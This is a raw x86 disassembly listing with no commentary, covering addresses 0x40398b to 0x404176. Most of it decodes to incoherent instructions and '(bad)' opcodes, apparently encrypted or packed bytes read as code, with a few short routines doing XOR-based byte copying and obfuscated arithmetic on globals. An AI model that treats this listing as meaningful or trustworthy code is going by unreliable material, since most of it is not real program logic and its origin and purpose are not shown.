  40398b:	and    eax,0x689268f8
  403990:	clc    
  403991:	mov    ebp,DWORD PTR [edx]
  403993:	push   esp
  403994:	mov    al,0x11
  403996:	sub    BYTE PTR [esi],bh
  403998:	fcom   QWORD PTR [eax+0x7fb8167e]
  40399e:	and    ecx,0x1ee29a05
  4039a4:	inc    esi
  4039a5:	(bad)  
  4039a6:	rcr    DWORD PTR [esi],1
  4039a8:	sbb    DWORD PTR [esi-0x29],0x15
  4039ac:	push   ebx
  4039ad:	jns    0x4039b5
  4039af:	test   BYTE PTR [ebp-0x8],dl
  4039b2:	jp     0x40399f
  4039b4:	leave  
  4039b5:	push   edi
  4039b6:	xor    dh,BYTE PTR [ecx+edx*1-0x73]
  4039ba:	mov    ebp,DWORD PTR [edx+0x70]
  4039bd:	test   eax,0x1fcbf772
  4039c2:	pop    ecx
  4039c3:	dec    eax
  4039c4:	icebp  
  4039c5:	or     eax,esp
  4039c7:	mov    ch,0x44
  4039c9:	xchg   esp,eax
  4039ca:	call   0x3f5f:0x7df0568
  4039d1:	dec    edi
  4039d2:	pop    esi
  4039d3:	call   0xb701b837
  4039d8:	lock sar dh,0x90
  4039dc:	lock or WORD PTR [ecx-0x4e],cx
  4039e1:	iret   
  4039e2:	iret   
  4039e3:	(bad)  
  4039e4:	push   ds
  4039e5:	fld1   
  4039e7:	xlat   BYTE PTR ds:[ebx]
  4039e8:	xchg   ebp,eax
  4039e9:	inc    esp
  4039ea:	js     0x4039c7
  4039ec:	arpl   WORD PTR [ebx+ebp*8+0x69],si
  4039f0:	inc    eax
  4039f1:	pop    esp
  4039f2:	cli    
  4039f3:	in     eax,dx
  4039f4:	cmp    DWORD PTR [edi+0x14],edx
  4039f7:	clc    
  4039f8:	inc    ebp
  4039f9:	sbb    DWORD PTR [eax-0x7d],eax
  4039fc:	pop    ebx
  4039fd:	adc    ax,0xd52e
  403a01:	xchg   BYTE PTR [eax+0x89917e2],ch
  403a07:	sbb    al,cl
  403a09:	pushf  
  403a0a:	scas   eax,DWORD PTR es:[edi]
  403a0b:	mov    dl,0xd
  403a0d:	pop    ebp
  403a0e:	push   0xb8ce0e50
  403a13:	inc    esi
  403a14:	dec    ebp
  403a15:	sbb    DWORD PTR [ecx-0x49afeebe],0x3a
  403a1c:	stos   BYTE PTR es:[edi],al
  403a1d:	retf   
  403a1e:	xchg   BYTE PTR [edi],al
  403a20:	imul   edi,DWORD PTR [esp+esi*1],0xedef1971
  403a27:	or     eax,0xdd55e223
  403a2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a2d:	lea    edx,[eax-0x23]
  403a30:	xchg   edi,eax
  403a31:	call   0xe8ab70cf
  403a36:	mov    ch,0x60
  403a38:	push   eax
  403a39:	(bad)  
  403a3b:	pusha  
  403a3c:	jg     0x403a62
  403a3e:	test   BYTE PTR [ebx+0x70b59eed],bl
  403a44:	mov    esi,eax
  403a46:	in     al,dx
  403a47:	test   BYTE PTR [esi+0x19],dl
  403a4a:	cmp    eax,0x373ecd7d
  403a4f:	mov    edi,DWORD PTR fs:[ebp-0x4]
  403a53:	jmp    0x403c5f
  403a58:	addr16 jo 0x403aaa
  403a5b:	or     BYTE PTR [ebx+0x33],cl
  403a5e:	arpl   WORD PTR [ebx+0x3c],si
  403a61:	aas    
  403a62:	cwde   
  403a63:	pop    ss
  403a64:	inc    esp
  403a65:	adc    DWORD PTR ds:0x7c1e65fd,0x7c7f6d7c
  403a6f:	jl     0x403ad0
  403a71:	or     eax,0x3856a8d7
  403a76:	mov    dl,0x2f
  403a78:	mov    ebx,0x610acec
  403a7d:	add    eax,0x1d331135
  403a82:	xchg   ebx,eax
  403a83:	out    0xa3,eax
  403a85:	jp     0x403aca
  403a87:	data16 jl 0x403b02
  403a8a:	ffree  st(6)
  403a8c:	outs   dx,BYTE PTR ds:[esi]
  403a8d:	ss mov bl,0x40
  403a90:	outs   dx,BYTE PTR ds:[esi]
  403a91:	pushf  
  403a92:	xchg   esi,eax
  403a93:	jo     0x403aed
  403a95:	data16 (bad) 
  403a97:	cmp    esp,DWORD PTR [edx-0x1d]
  403a9a:	aas    
  403a9b:	mov    ds:0x95818c5,eax
  403aa0:	jmp    0xccfce1d6
  403aa5:	ret    
  403aa6:	dec    eax
  403aa7:	shl    DWORD PTR [esi-0x69],cl
  403aaa:	loope  0x403b02
  403aac:	mul    BYTE PTR [ecx+edi*8+0x2b]
  403ab0:	inc    ebp
  403ab1:	lods   eax,DWORD PTR ds:[esi]
  403ab2:	add    edi,esp
  403ab4:	bnd js 0x403b0f
  403ab7:	mov    ah,BYTE PTR [ebx-0x20]
  403aba:	sub    BYTE PTR [ecx],cl
  403abc:	jmp    0x152d:0x62bca987
  403ac3:	jg     0x403a46
  403ac5:	adc    esp,edi
  403ac7:	rol    DWORD PTR [esp+edi*2-0x269ad76c],cl
  403ace:	sub    al,0x6e
  403ad0:	addr16 pop es
  403ad2:	cli    
  403ad3:	mov    ds:0x34d58fbc,eax
  403ad8:	(bad)  
  403ad9:	sbb    BYTE PTR [edx-0xf],dl
  403adc:	dec    eax
  403add:	std    
  403ade:	jl     0x403a8f
  403ae0:	shl    ebp,1
  403ae2:	(bad)  
  403ae3:	jae    0x403b40
  403ae5:	lock clc 
  403ae7:	int3   
  403ae8:	jbe    0x403af4
  403aea:	cmp    ecx,esp
  403aec:	lea    edi,[ebp+0x7c1d8d5d]
  403af2:	outs   dx,BYTE PTR ds:[esi]
  403af3:	aam    0x6
  403af5:	xor    ebp,ebx
  403af7:	repnz loopne 0x403b46
  403afa:	data16 or BYTE PTR [edx-0x6a],al
  403afe:	test   BYTE PTR [ecx],dl
  403b00:	aaa    
  403b01:	mov    WORD PTR [edx+0x29011827],?
  403b07:	loop   0x403ab5
  403b09:	adc    DWORD PTR [edx+eiz*8-0x26],0x27dc0372
  403b11:	dec    edx
  403b12:	xlat   BYTE PTR ds:[ebx]
  403b13:	cmp    ecx,DWORD PTR [ecx+ebx*4+0x5d]
  403b17:	inc    edx
  403b18:	repz fsubr QWORD PTR [ecx]
  403b1b:	push   edi
  403b1c:	cwde   
  403b1d:	out    dx,eax
  403b1e:	push   esp
  403b1f:	pop    ss
  403b20:	fcomp  QWORD PTR [ecx+0x9]
  403b23:	stos   DWORD PTR es:[edi],eax
  403b24:	dec    esp
  403b25:	gs imul edi,ebp,0x5d
  403b29:	mov    ebp,0xcac9581f
  403b2e:	add    cl,BYTE PTR [edi-0xe]
  403b31:	jecxz  0x403b32
  403b33:	lods   eax,DWORD PTR ds:[esi]
  403b34:	inc    ebx
  403b35:	dec    ecx
  403b36:	pop    ebx
  403b37:	sti    
  403b38:	push   cs
  403b39:	cld    
  403b3a:	xchg   BYTE PTR [ebx],ch
  403b3c:	in     al,dx
  403b3d:	push   DWORD PTR [edi-0x5db6cbc3]
  403b43:	xor    ebx,DWORD PTR [ebx-0x52881111]
  403b49:	sub    eax,0x28835355
  403b4e:	sbb    edx,0xffffff99
  403b51:	adc    DWORD PTR [edi],esi
  403b53:	jb     0x403b74
  403b55:	push   cx
  403b57:	inc    ebp
  403b58:	push   esi
  403b59:	adc    al,BYTE PTR [edx-0x2b]
  403b5c:	adc    al,0xa4
  403b5e:	push   edi
  403b5f:	cmc    
  403b60:	clc    
  403b61:	dec    ecx
  403b62:	pop    ss
  403b63:	add    al,0x64
  403b65:	cmp    BYTE PTR [bp+di],bl
  403b68:	xor    BYTE PTR [eax-0x9],0x9d
  403b6c:	mov    BYTE PTR cs:[edi],al
  403b6f:	jbe    0x403baa
  403b71:	push   ecx
  403b72:	xchg   edx,eax
  403b73:	out    0x1e,eax
  403b75:	push   esi
  403b76:	into   
  403b77:	in     eax,dx
  403b78:	mov    eax,ds:0x260d4d49
  403b7d:	out    0xd1,al
  403b7f:	or     BYTE PTR [ebp+0xe],cl
  403b82:	ret    0xbe8d
  403b85:	out    dx,al
  403b86:	cmp    BYTE PTR [ebx+0x4b44012c],ah
  403b8c:	sbb    DWORD PTR fs:[eax+0x51d15d79],ecx
  403b93:	push   esi
  403b94:	hlt    
  403b95:	pop    ss
  403b96:	sub    ecx,DWORD PTR [edi]
  403b98:	iret   
  403b99:	xchg   eax,edi
  403b9b:	adc    al,0x62
  403b9d:	and    ebp,ecx
  403b9f:	add    al,al
  403ba1:	add    al,0xd0
  403ba3:	sbb    al,0xd
  403ba5:	int    0x46
  403ba7:	and    BYTE PTR [ebx-0x35],ch
  403baa:	xor    ecx,DWORD PTR [esi-0x59]
  403bad:	lahf   
  403bae:	pop    edi
  403baf:	mov    eax,ds:0x332a6e36
  403bb4:	xor    dh,BYTE PTR [edi]
  403bb6:	cmp    al,0x7c
  403bb8:	icebp  
  403bb9:	inc    DWORD PTR [esp+eax*8]
  403bbc:	xchg   DWORD PTR [ebx],ebp
  403bbe:	in     eax,0x4
  403bc0:	push   0x3ad783d6
  403bc5:	sahf   
  403bc6:	mov    ebx,0x3ce5b101
  403bcb:	shl    BYTE PTR [esi],cl
  403bcd:	pop    ecx
  403bce:	outs   dx,DWORD PTR ds:[esi]
  403bcf:	pushf  
  403bd0:	rol    DWORD PTR [ecx],cl
  403bd2:	cmp    eax,0x1c6572b0
  403bd7:	mov    ebx,0x4603ac33
  403bdc:	push   ss
  403bdd:	mov    esp,0x5f41c35
  403be2:	or     ch,BYTE PTR [esi-0x47756226]
  403be8:	fst    DWORD PTR [ebx]
  403bea:	jmp    0x3f42:0xa2948aa5
  403bf1:	and    edx,edx
  403bf3:	out    dx,al
  403bf4:	jno    0x403b89
  403bf6:	aad    0xf4
  403bf8:	or     bl,cl
  403bfa:	inc    edi
  403bfb:	test   DWORD PTR [ebp-0x34100343],ebp
  403c01:	(bad)  
  403c02:	pop    ebp
  403c03:	test   ch,0xcb
  403c06:	pop    es
  403c07:	les    esp,FWORD PTR [edi-0x2870b727]
  403c0d:	(bad)  
  403c0e:	mov    ecx,0x6e1eef2d
  403c13:	arpl   WORD PTR [esi-0x12b18242],ax
  403c19:	popa   
  403c1a:	sbb    DWORD PTR [eax+0x71a68cc5],ebx
  403c20:	mov    ecx,cs
  403c22:	jmp    0x76389cf
  403c27:	xacquire xchg DWORD PTR [edx-0x3b],edi
  403c2b:	dec    ebx
  403c2c:	add    BYTE PTR [edx+0xc],bl
  403c2f:	push   ds
  403c30:	or     eax,DWORD PTR [ecx+ecx*1]
  403c33:	mov    ch,0x40
  403c36:	jp     0x403ca7
  403c38:	mov    edi,0xb6491226
  403c3d:	xor    DWORD PTR [eax-0x74],edx
  403c40:	inc    ecx
  403c41:	cmc    
  403c42:	inc    eax
  403c43:	pop    ebx
  403c44:	inc    eax
  403c45:	fsub   DWORD PTR [ecx-0x36]
  403c48:	cmp    BYTE PTR [ecx],dl
  403c4a:	add    al,0xdf
  403c4c:	push   ebx
  403c4d:	xchg   BYTE PTR [ebx-0x20],bl
  403c50:	and    eax,0x942ede35
  403c55:	sub    eax,0x8a6df844
  403c5a:	jb     0x403c98
  403c5c:	xchg   edx,eax
  403c5d:	inc    ecx
  403c5e:	xor    BYTE PTR [ebx],dh
  403c60:	stc    
  403c61:	add    edi,esi
  403c63:	mov    esi,DWORD PTR [ebp+0x8]
  403c66:	imul   edi,edx
  403c69:	mov    ebx,DWORD PTR [ebp+0xc]
  403c6c:	xor    eax,ecx
  403c6e:	add    eax,edx
  403c70:	mov    al,BYTE PTR [ebx+eax*1+0x32729a]
  403c77:	mov    BYTE PTR [edi+esi*1],al
  403c7a:	mov    eax,DWORD PTR [ebp-0x4]
  403c7d:	xor    eax,ecx
  403c7f:	lea    edx,[edx+eax*1+0x32729a]
  403c86:	mov    eax,DWORD PTR [ebp-0x4]
  403c89:	xor    eax,ecx
  403c8b:	mov    esi,0xffcd8d66
  403c90:	jmp    0x403e9c
  403c95:	dec    edi
  403c96:	push   ss
  403c97:	sbb    eax,DWORD PTR [ebp+ebp*2+0x7d]
  403c9b:	jae    0x403cae
  403c9d:	sti    
  403c9e:	adc    ebp,DWORD PTR ds:0xbb08c297
  403ca4:	js     0x403cf0
  403ca6:	sbb    BYTE PTR [esp+edi*2+0x6d],bh
  403caa:	jg     0x403d28
  403cac:	jl     0x403c9c
  403cae:	jae    0x403d02
  403cb0:	aaa    
  403cb1:	aad    0xb5
  403cb3:	pop    eax
  403cb4:	add    BYTE PTR [eax-0x3d],0x58
  403cb8:	push   eax
  403cb9:	std    
  403cba:	ins    DWORD PTR es:[edi],dx
  403cbb:	mov    WORD PTR [ebx-0x7c],fs
  403cbe:	mov    ebx,0x455ba967
  403cc3:	mov    edi,0x5099dbe0
  403cc8:	adc    eax,0xe965b179
  403ccd:	dec    ecx
  403cce:	push   0x7a
  403cd0:	sbb    eax,0x9003f54b
  403cd5:	div    ecx
  403cd7:	test   BYTE PTR [eax-0x501b1af6],al
  403cdd:	rcl    ch,1
  403cdf:	inc    ebx
  403ce0:	scas   al,BYTE PTR es:[edi]
  403ce1:	xchg   ebx,ebp
  403ce3:	fstp   QWORD PTR es:[ecx-0xb175a5c]
  403cea:	nop
  403ceb:	cmc    
  403cec:	dec    esp
  403ced:	sahf   
  403cee:	clc    
  403cef:	jno    0x403c8a
  403cf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cf2:	lahf   
  403cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cf4:	or     DWORD PTR [ecx+0x62],ecx
  403cf7:	psubusw mm4,QWORD PTR [esi+eax*4]
  403cfb:	mov    edi,0x245dd58b
  403d00:	adc    al,0x6
  403d02:	xor    BYTE PTR [esi],ah
  403d04:	mov    ah,0x6
  403d06:	and    esp,0xffffffae
  403d09:	pop    ss
  403d0a:	sub    DWORD PTR [edi+0x58f4f4f6],esi
  403d10:	add    dl,BYTE PTR [esi+eax*2+0x2]
  403d14:	xchg   ebp,eax
  403d15:	or     al,0x10
  403d17:	out    0x9f,al
  403d19:	xor    eax,0xadb536a9
  403d1e:	in     eax,0x7f
  403d20:	mov    BYTE PTR ss:[ebp-0x2c],bl
  403d24:	inc    esi
  403d25:	xor    DWORD PTR [ecx+edi*4+0x15],0x7c859f22
  403d2d:	mov    ebp,0xd56c3d33
  403d32:	mov    dl,BYTE PTR [edi+0xb]
  403d35:	inc    eax
  403d36:	push   0x49a1a94c
  403d3b:	inc    ebp
  403d3c:	out    0x91,al
  403d3e:	add    al,0xd7
  403d40:	jg     0x403d60
  403d42:	xor    ebx,DWORD PTR [eax-0x58]
  403d45:	cmp    eax,DWORD PTR [ecx+0x4a8d6302]
  403d4b:	push   0x7a
  403d4d:	or     eax,0xbe174fd5
  403d52:	jg     0x403cd7
  403d54:	arpl   WORD PTR [edi+0x7acc7cd4],sp
  403d5a:	pusha  
  403d5b:	sub    BYTE PTR [edi],al
  403d5d:	mov    ebp,?
  403d5f:	cmp    eax,edi
  403d61:	sbb    al,0xc7
  403d63:	xor    BYTE PTR [edi+0x483583af],dh
  403d69:	push   eax
  403d6a:	and    ebx,ebp
  403d6c:	out    dx,al
  403d6d:	je     0x403dcb
  403d6f:	mov    edx,0xaeeb110b
  403d74:	jne    0x403dec
  403d76:	mov    eax,DWORD PTR [edi+ecx*2-0x6b]
  403d7a:	cmc    
  403d7b:	pop    esp
  403d7c:	jae    0x403dd6
  403d7e:	jbe    0x403d4e
  403d80:	mov    bh,BYTE PTR [eax-0x47ef1ac8]
  403d86:	aaa    
  403d87:	sti    
  403d88:	push   ebp
  403d89:	loope  0x403e08
  403d8b:	aaa    
  403d8c:	or     eax,0x4af704e
  403d91:	retf   0xcabc
  403d94:	loopne 0x403de1
  403d96:	jnp    0x403d2c
  403d98:	shr    ch,0x1a
  403d9b:	mov    dh,0x79
  403d9d:	pop    ss
  403d9e:	mov    dh,0x7b
  403da0:	test   esp,0xb8bc4186
  403da6:	dec    eax
  403da7:	sar    DWORD PTR [ebx-0x29],0x9c
  403dab:	aaa    
  403dac:	push   cs
  403dad:	mov    al,bl
  403daf:	fild   DWORD PTR [esi]
  403db1:	mov    eax,ds:0x2e0de613
  403db6:	dec    eax
  403db7:	ret    
  403db8:	mov    cl,0xfc
  403dba:	sub    al,BYTE PTR ds:0x8852f68
  403dc0:	add    DWORD PTR [esi],edi
  403dc2:	popf   
  403dc3:	or     ch,al
  403dc5:	test   BYTE PTR [ecx-0x31],0x8b
  403dc9:	sub    DWORD PTR [ebx],edx
  403dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dcc:	ja     0x403d51
  403dce:	mov    esp,0xca0b8dfc
  403dd3:	popf   
  403dd4:	add    eax,0x40bbcb42
  403dd9:	xchg   dh,dh
  403ddb:	scas   eax,DWORD PTR es:[edi]
  403ddc:	in     eax,dx
  403ddd:	scas   eax,DWORD PTR es:[edi]
  403dde:	bound  edx,QWORD PTR [eax]
  403de0:	mov    ecx,0xa7b54059
  403de5:	sbb    al,al
  403de7:	add    BYTE PTR [edx+eax*1+0x3a6118c],ah
  403dee:	in     al,0x79
  403df0:	push   edi
  403df1:	xor    ebx,ebx
  403df3:	daa    
  403df4:	popa   
  403df5:	call   0xa1d7:0x3bd15cff
  403dfc:	lods   al,BYTE PTR ds:[esi]
  403dfd:	cmp    eax,eax
  403dff:	mov    edi,0x831e23f3
  403e04:	add    eax,0xa3420220
  403e09:	adc    eax,0xfdf7768a
  403e0e:	lods   eax,DWORD PTR ds:[esi]
  403e0f:	sti    
  403e10:	sub    esp,esp
  403e12:	mov    es,WORD PTR [ebp-0x31fcc4ac]
  403e18:	ins    DWORD PTR es:[edi],dx
  403e19:	mov    bh,0x13
  403e1b:	test   edi,esi
  403e1d:	mov    ds:0x80ec94aa,al
  403e22:	repz les ebx,FWORD PTR [edx]
  403e25:	aas    
  403e26:	stos   DWORD PTR es:[edi],eax
  403e27:	jne    0x403ea1
  403e29:	loopne 0x403dba
  403e2b:	inc    edi
  403e2c:	mov    esp,0x45afaf79
  403e31:	test   BYTE PTR [eax+0x15],cl
  403e34:	pop    edi
  403e35:	push   edi
  403e36:	adc    BYTE PTR [eax+0x1c6366bc],ah
  403e3c:	and    eax,0xc6b3df9f
  403e41:	push   esp
  403e42:	fstp   QWORD PTR [ecx-0x5a2b2968]
  403e48:	xchg   ecx,eax
  403e49:	stos   BYTE PTR es:[edi],al
  403e4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e4b:	lahf   
  403e4c:	pusha  
  403e4d:	push   esp
  403e4e:	mov    ds:0x9679d622,eax
  403e53:	fwait
  403e54:	dec    ecx
  403e55:	pop    edi
  403e56:	stos   DWORD PTR es:[edi],eax
  403e57:	(bad)  
  403e58:	inc    ebp
  403e59:	stos   BYTE PTR es:[edi],al
  403e5a:	sub    al,0xb4
  403e5c:	xchg   ebp,eax
  403e5d:	mov    dl,0xc5
  403e5f:	cs push edi
  403e61:	lods   eax,DWORD PTR gs:[esi]
  403e63:	ds fwait
  403e65:	icebp  
  403e66:	fmul   DWORD PTR [ecx+0x4b]
  403e69:	inc    eax
  403e6a:	scas   eax,DWORD PTR es:[edi]
  403e6b:	adc    dh,BYTE PTR [edi]
  403e6d:	hlt    
  403e6e:	pop    ds
  403e6f:	pop    es
  403e70:	mov    edx,0x883106e7
  403e75:	pusha  
  403e76:	fmul   st,st(4)
  403e78:	mov    al,0x3c
  403e7a:	adc    al,0xd0
  403e7c:	jb     0x403e21
  403e7e:	shr    BYTE PTR [edx+0x65],0x3
  403e82:	xchg   edi,eax
  403e83:	fisttp DWORD PTR [edx+ebp*8]
  403e86:	mov    DWORD PTR [esi+0x2],ebp
  403e89:	mov    edi,0xcc40ea9f
  403e8e:	dec    eax
  403e8f:	test   bh,dl
  403e91:	xlat   BYTE PTR ds:[ebx]
  403e92:	cmp    BYTE PTR [edi+eax*2+0x16],0x4b
  403e97:	lods   al,BYTE PTR ds:[esi]
  403e98:	hlt    
  403e99:	dec    edi
  403e9a:	or     dl,BYTE PTR [ebp+0x2b]
  403e9d:	lock add esi,DWORD PTR [ebp+0x10]
  403ea1:	cmp    edx,esi
  403ea3:	jbe    0x403630
  403ea9:	pop    ebx
  403eaa:	mov    eax,0xf89c8534
  403eaf:	pop    edi
  403eb0:	pop    esi
  403eb1:	leave  
  403eb2:	ret    0xc
  403eb5:	push   ebp
  403eb6:	mov    ebp,esp
  403eb8:	mov    eax,DWORD PTR [ebp+0xc]
  403ebb:	xor    edx,edx
  403ebd:	mov    ecx,0x7264fcad
  403ec2:	div    ecx
  403ec4:	mov    ecx,DWORD PTR [ebp+0x10]
  403ec7:	and    ecx,eax
  403ec9:	jmp    0x4040d5
  403ece:	(bad)  
  403ecf:	addr16 jns 0x403f24
  403ed2:	icebp  
  403ed3:	jb     0x403f28
  403ed5:	ins    DWORD PTR es:[edi],dx
  403ed6:	add    al,0x2a
  403ed8:	pop    esi
  403ed9:	push   0xc9edd748
  403ede:	mov    ebx,0x6d7c7c1a
  403ee3:	jg     0x403f61
  403ee5:	jl     0x403e7b
  403ee7:	jo     0x403f5e
  403ee9:	fs inc eax
  403eeb:	icebp  
  403eec:	sbb    edx,DWORD PTR [edx]
  403eee:	std    
  403eef:	mov    dl,0xf8
  403ef1:	xchg   edi,eax
  403ef2:	dec    edi
  403ef3:	aaa    
  403ef4:	xor    eax,0x54b1be7e
  403ef9:	aam    0x29
  403efb:	sbb    al,dl
  403efd:	cwde   
  403efe:	push   esi
  403eff:	das    
  403f00:	mov    ah,0xf5
  403f02:	arpl   si,cx
  403f04:	ins    BYTE PTR es:[edi],dx
  403f05:	cmp    BYTE PTR [edi+0x6e],cl
  403f08:	sub    BYTE PTR [edx+0x6800bc04],cl
  403f0e:	(bad)
  403f11:	mov    ds:0x4d628ebe,eax
  403f16:	push   ecx
  403f17:	mov    edx,0x362fe7e1
  403f1c:	sub    eax,0x3195b496
  403f21:	imul   ecx,DWORD PTR [edi+0x47],0x96822a60
  403f28:	or     ecx,esi
  403f2a:	dec    eax
  403f2b:	sbb    esp,DWORD PTR ds:0x9d36c3f6
  403f31:	jmp    0x30ce21fc
  403f36:	jg     0x403f2a
  403f38:	xor    BYTE PTR [edx-0x7e7f7d7f],ah
  403f3e:	jbe    0x403ee1
  403f40:	push   esi
  403f41:	adc    BYTE PTR [edi-0x3dcc7151],ah
  403f47:	mov    al,ds:0x9679ebfe
  403f4c:	jns    0x403eec
  403f4e:	push   ds
  403f4f:	jbe    0x403f81
  403f51:	pop    ecx
  403f52:	mov    ds:0xfa480bf0,al
  403f57:	scas   al,BYTE PTR es:[edi]
  403f58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f59:	jo     0x403fd7
  403f5b:	dec    eax
  403f5c:	mov    bl,0xaf
  403f5e:	scas   eax,DWORD PTR es:[edi]
  403f5f:	add    eax,ecx
  403f61:	rol    DWORD PTR [ebx],cl
  403f63:	scas   al,BYTE PTR es:[edi]
  403f64:	(bad)  
  403f65:	sub    cl,BYTE PTR [edi-0x54]
  403f68:	mov    ebx,0xcece1d35
  403f6d:	stc    
  403f6e:	add    DWORD PTR [ecx-0x4f],esi
  403f71:	and    ah,BYTE PTR [edx]
  403f73:	mov    ch,0x6d
  403f75:	out    0x1c,eax
  403f77:	sti    
  403f78:	jmp    0x403fdf
  403f7a:	jl     0x403fb2
  403f7c:	mov    DWORD PTR [edx+edi*1],ecx
  403f7f:	mov    esp,0xd64e0255
  403f84:	sub    DWORD PTR [eax+0x506ffd41],esi
  403f8a:	fisubr DWORD PTR [edx]
  403f8c:	cmp    BYTE PTR [ebx-0x4a],dl
  403f8f:	fcom   QWORD PTR [edi+0x7f70b401]
  403f95:	imul   esp,DWORD PTR ds:0x18744856,0xffffff83
  403f9c:	and    eax,0xad5899b6
  403fa1:	sub    cl,BYTE PTR [ebx]
  403fa3:	pop    edi
  403fa4:	fwait
  403fa5:	push   0x77
  403fa7:	pop    ds
  403fa8:	pop    ss
  403fa9:	sbb    eax,0xdac157dd
  403fae:	push   0xffffff89
  403fb0:	xor    esp,DWORD PTR [esi-0x44]
  403fb3:	std    
  403fb4:	and    BYTE PTR gs:[edi-0x31],ah
  403fb8:	outs   dx,DWORD PTR ds:[esi]
  403fb9:	mov    ebx,0x73d299ee
  403fbe:	adc    DWORD PTR [ebp-0x3a],edx
  403fc1:	xchg   ebp,eax
  403fc2:	loopne 0x403faa
  403fc4:	lods   eax,DWORD PTR ds:[esi]
  403fc5:	add    eax,ebp
  403fc7:	rcl    DWORD PTR [edx],cl
  403fc9:	dec    edx
  403fca:	sbb    DWORD PTR [ecx],edi
  403fcc:	jmp    0xbc60:0xe102bc56
  403fd3:	jae    0x403fcd
  403fd5:	cmp    esp,DWORD PTR [ebp-0x7a0f3284]
  403fdb:	inc    esi
  403fdc:	lds    edi,FWORD PTR [ebx+0xf]
  403fdf:	inc    esp
  403fe0:	shl    BYTE PTR [eax],cl
  403fe2:	or     al,0xe9
  403fe4:	adc    ch,BYTE PTR [ebp+edx*1-0x12]
  403fe8:	jecxz  0x403fa9
  403fea:	repnz xchg edi,eax
  403fec:	not    BYTE PTR [esi]
  403fee:	adc    DWORD PTR [edx-0x22133f96],edi
  403ff4:	call   0x6073:0x1c322523
  403ffb:	addr16 add al,0x67
  403ffe:	shr    WORD PTR [edi],0x10
  404002:	cmp    ecx,DWORD PTR [esi-0x7bc7cb31]
  404008:	sbb    al,0xa5
  40400a:	sbb    DWORD PTR [edi],0x2ffb24c7
  404010:	mov    ch,0x4f
  404012:	loope  0x404087
  404014:	mov    ebx,0x1a24f2dd
  404019:	lods   eax,DWORD PTR ds:[esi]
  40401a:	(bad)  [esi+0x56df309b]
  404020:	jecxz  0x403fa6
  404022:	mov    ah,bl
  404024:	adc    eax,0x477b805f
  404029:	jecxz  0x40403a
  40402b:	shl    DWORD PTR [ebx+0x263857b0],cl
  404031:	mov    esp,0xd6d74154
  404036:	hlt    
  404037:	jmp    0xe124d37a
  40403c:	add    DWORD PTR [edx+eax*2],0x92b9c31a
  404043:	loope  0x404093
  404045:	out    dx,al
  404046:	jp     0x404037
  404048:	test   eax,0x758864b7
  40404d:	inc    edi
  40404e:	fnsave [ebp+0x2b]
  404051:	jg     0x404044
  404053:	dec    edi
  404054:	imul   ebx,DWORD PTR [ecx],0xffffffac
  404057:	arpl   WORD PTR [edx+0x7bd4394a],cx
  40405d:	std    
  40405e:	repz jecxz 0x40409c
  404061:	mov    eax,0xb3336d1b
  404066:	push   0x73edf224
  40406b:	push   eax
  40406c:	adc    DWORD PTR [ebp-0x7e024a16],ebx
  404072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404073:	(bad)  
  404074:	or     ebx,eax
  404076:	xchg   esp,eax
  404077:	mov    ch,0x28
  404079:	and    al,0x8
  40407b:	dec    edx
  40407c:	pop    es
  40407d:	and    al,0x56
  40407f:	mov    ds:0x6482fdad,al
  404084:	add    bh,BYTE PTR [edi+0x1a]
  404087:	inc    ebx
  404088:	mov    cl,0xeb
  40408a:	dec    edx
  40408b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40408c:	push   edx
  40408d:	test   eax,0x78b97012
  404092:	repnz idiv BYTE PTR [eax+0x3e]
  404096:	test   BYTE PTR [ebp+0x161bbd5b],al
  40409c:	mov    ebp,0xb73c9920
  4040a1:	dec    ebp
  4040a2:	adc    bl,dl
  4040a4:	fild   QWORD PTR [ebx+0x46]
  4040a7:	pop    edi
  4040a8:	js     0x40404e
  4040aa:	jbe    0x404078
  4040ac:	aas    
  4040ad:	fs pop ebx
  4040af:	test   al,0x6d
  4040b1:	cmc    
  4040b2:	pushf  
  4040b3:	lods   al,BYTE PTR ds:[esi]
  4040b4:	jmp    0x404108
  4040b6:	dec    edx
  4040b7:	ror    BYTE PTR [eax-0x15],1
  4040ba:	leave  
  4040bb:	mov    eax,ds:0xd96d3a64
  4040c0:	mov    DWORD PTR [edx+esi*2],esp
  4040c3:	nop
  4040c4:	or     DWORD PTR [ecx-0x1218e077],esp
  4040ca:	call   0x8020f7aa
  4040cf:	inc    esi
  4040d0:	xchg   edi,eax
  4040d1:	pop    edi
  4040d2:	lods   al,BYTE PTR ds:[esi]
  4040d3:	neg    BYTE PTR [ecx+0x1d8fc981]
  4040d9:	push   ss
  4040da:	or     DWORD PTR [ebx+0x18c25dc1],0xec8b5500
  4040e4:	sub    esp,0x58
  4040e7:	xor    DWORD PTR ds:0x4337b3,0x2c9d
  4040f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4040f4:	sbb    eax,DWORD PTR ds:0x4337f3
  4040fa:	mov    eax,0x8a3a
  4040ff:	sub    DWORD PTR ds:0x43372b,0x44c4
  404109:	xor    ax,WORD PTR [ecx+0x20]
  40410d:	sub    ecx,0x3d49
  404113:	mov    ecx,0x3b00
  404118:	xor    DWORD PTR ds:0x4336c7,0x649a
  404122:	add    ax,cx
  404125:	movzx  eax,ax
  404128:	mov    DWORD PTR [ebp-0xc],eax
  40412b:	mov    ecx,DWORD PTR ds:0x4337db
  404131:	and    DWORD PTR ds:0x4337a7,ecx
  404137:	mov    BYTE PTR [ebp-0x1],0x7f
  40413b:	sub    ecx,0x46a5
  404141:	lea    eax,[ebp-0x1]
  404144:	mov    DWORD PTR [ebp-0x10],eax
  404147:	adc    DWORD PTR ds:0x4336bf,ecx
  40414d:	mov    al,BYTE PTR [ebp-0x1]
  404150:	movzx  ecx,WORD PTR ds:0x4336c3
  404157:	or     ecx,DWORD PTR ds:0x433717
  40415d:	mov    DWORD PTR ds:0x4336c3,ecx
  404163:	mov    ecx,DWORD PTR [ebp-0x10]
  404166:	xor    al,0x45
  404168:	sub    DWORD PTR ds:0x433773,0x7f5e
  404172:	sub    al,0x39
  404174:	mov    BYTE PTR [ecx],al
  404176:	mov    DWORD PTR [ebp-0x8],0xf89c8535
